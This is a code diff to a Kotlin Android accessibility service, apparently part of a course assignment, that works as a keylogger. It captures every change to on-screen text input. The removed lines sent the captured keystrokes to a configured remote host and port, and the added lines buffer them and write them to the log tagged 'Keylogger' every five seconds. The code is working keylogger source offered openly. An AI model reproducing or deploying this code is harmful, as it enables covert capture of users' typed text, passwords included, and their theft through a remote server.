@@ -2,24 +2,16 @@ package com.example.assignment1
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.os.CountDownTimer
+import android.os.Handler
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import com.example.assignment1.DataRetriever.Config_var
-import com.example.assignment1.DataRetriever.MessageSender
 
 class MyAccessibilityService : AccessibilityService() {
-    var ip: String? = null
-    var port: String? = null
+    var buffer: String? = ""
 
     fun send(text: String?) {
-        if (ip == null) {
-            val tmp = Config_var()
-            ip = tmp.HOST
-            port = tmp.PORT
-        }
-        if (ip !== "none" || port !== "none") {
-            val messageSender = MessageSender()
-            messageSender.execute(text, ip, port)
-        }
+        Log.d("Keylogger", buffer!!)
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
@@ -28,22 +20,34 @@ class MyAccessibilityService : AccessibilityService() {
         when (eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "Typing: "
         }
-        eventText = eventText + event.text
-
-        send(eventText)
+        buffer = eventText + event.text
     }
 
     override fun onInterrupt() {
-        send("[-] Interrupted !!! ")
+        //send("[-] Interrupted !!! ")
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        send("[+] Connected")
+        Log.d("Keylogger", "[+] Connected")
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
-        info.notificationTimeout = 10000
+        info.notificationTimeout = 100
         serviceInfo = info
+
+        val handler = Handler()
+        handler.postDelayed(object : Runnable {
+            override fun run() {
+                if (buffer != "")
+                {
+                    Log.d("Keylogger", buffer!!)
+                    buffer = ""
+                }
+                else
+                    Log.d("Keylogger", "Empty")
+                handler.postDelayed(this, 5000)
+            }
+        }, 5000)
     }
 }
